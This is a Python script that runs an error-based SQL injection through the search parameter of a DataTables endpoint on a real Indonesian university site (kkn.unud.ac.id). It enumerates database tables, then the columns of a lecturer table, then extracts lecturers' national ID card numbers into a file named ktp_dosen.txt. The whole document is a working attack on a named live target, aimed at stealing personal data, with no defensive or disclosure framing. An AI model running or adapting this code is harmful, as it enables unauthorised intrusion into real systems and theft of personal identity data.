import requests
from bs4 import BeautifulSoup

def exploit():
    conn = requests.Session()
    url = "https://kkn.unud.ac.id/public/home/list_proposal"
    file = open("table.txt", "w+")
    for i in range(104):
        params = {
            "sEcho":"2",
            "iColumns":"4",
            "sColumns":"",
            "iDisplayStart":"0",
            "iDisplayLength":"10",
            "mDataProp_0":"0",
            "mDataProp_1":"1",
            "mDataProp_2":"2",
            "mDataProp_3":"3",
            "sSearch":"')) and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit {},1)))-- ".format(i),
            "bRegex":"false",
            "sSearch_0":"",
            "bRegex_0":"false",
            "bSearchable_0":"true",
            "sSearch_1":"",
            "bRegex_1":"false",
            "bSearchable_1":"true",
            "sSearch_2":"",
            "bRegex_2":"false",
            "bSearchable_2":"true",
            "sSearch_3":"",
            "bRegex_3":"false",
            "bSearchable_3":"true",
            "iSortCol_0":"0",
            "sSortDir_0":"asc",
            "iSortingCols":"1",
            "bSortable_0":"false",
            "bSortable_1":"true",
            "bSortable_2":"true",
            "bSortable_3":"true",
            "periode_kkn":"",
            "lokasi_kkn":"",
            "is_proposal":"1",
            "_":"1588056265164"
        }

        shit = conn.get(url = url, params = params).text
        soup = BeautifulSoup(shit, 'html.parser')
        leak = str(soup.findAll('p')[1])
        print "Table {}: {}".format(i + 1, leak[25:-5])
        file.write(leak[25:-5] + '\r\n')

def getColumns():
    conn = requests.Session()
    url = "https://kkn.unud.ac.id/public/home/list_proposal"
    # file = open("table.txt", "w+")
    for i in range(104):
        params = {
            "sEcho":"2",
            "iColumns":"4",
            "sColumns":"",
            "iDisplayStart":"0",
            "iDisplayLength":"10",
            "mDataProp_0":"0",
            "mDataProp_1":"1",
            "mDataProp_2":"2",
            "mDataProp_3":"3",
            "sSearch":"')) and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='m_dosen' limit {},1)))-- ".format(i),
            "bRegex":"false",
            "sSearch_0":"",
            "bRegex_0":"false",
            "bSearchable_0":"true",
            "sSearch_1":"",
            "bRegex_1":"false",
            "bSearchable_1":"true",
            "sSearch_2":"",
            "bRegex_2":"false",
            "bSearchable_2":"true",
            "sSearch_3":"",
            "bRegex_3":"false",
            "bSearchable_3":"true",
            "iSortCol_0":"0",
            "sSortDir_0":"asc",
            "iSortingCols":"1",
            "bSortable_0":"false",
            "bSortable_1":"true",
            "bSortable_2":"true",
            "bSortable_3":"true",
            "periode_kkn":"",
            "lokasi_kkn":"",
            "is_proposal":"1",
            "_":"1588056265164"
        }

        shit = conn.get(url = url, params = params).text
        soup = BeautifulSoup(shit, 'html.parser')
        leak = str(soup.findAll('p')[1])
        print "Columns {}: {}".format(i + 1, leak[25:-5])
        # file.write(leak[25:-5] + '\r\n')

def getData():
    conn = requests.Session()
    url = "https://kkn.unud.ac.id/public/home/list_proposal"
    file = open("ktp_dosen.txt", "w+")
    for i in range(200):
        params = {
            "sEcho":"2",
            "iColumns":"4",
            "sColumns":"",
            "iDisplayStart":"0",
            "iDisplayLength":"10",
            "mDataProp_0":"0",
            "mDataProp_1":"1",
            "mDataProp_2":"2",
            "mDataProp_3":"3",
            "sSearch":"')) and extractvalue(0x0a,concat(0x0a,(select no_ktp from m_dosen ORDER BY id_dosen ASC limit {},1)))-- ".format(i),
            "bRegex":"false",
            "sSearch_0":"",
            "bRegex_0":"false",
            "bSearchable_0":"true",
            "sSearch_1":"",
            "bRegex_1":"false",
            "bSearchable_1":"true",
            "sSearch_2":"",
            "bRegex_2":"false",
            "bSearchable_2":"true",
            "sSearch_3":"",
            "bRegex_3":"false",
            "bSearchable_3":"true",
            "iSortCol_0":"0",
            "sSortDir_0":"asc",
            "iSortingCols":"1",
            "bSortable_0":"false",
            "bSortable_1":"true",
            "bSortable_2":"true",
            "bSortable_3":"true",
            "periode_kkn":"",
            "lokasi_kkn":"",
            "is_proposal":"1",
            "_":"1588056265164"
        }
    
        shit = conn.get(url = url, params = params).text
        soup = BeautifulSoup(shit, 'html.parser')
        leak = str(soup.findAll('p')[1])
        print "Columns {}: {}".format(i + 1, leak[25:-5])
        file.write(leak[25:-5] + '\r\n')

if __name__ == "__main__":
    exploit()
    # getColumns()
    # getData()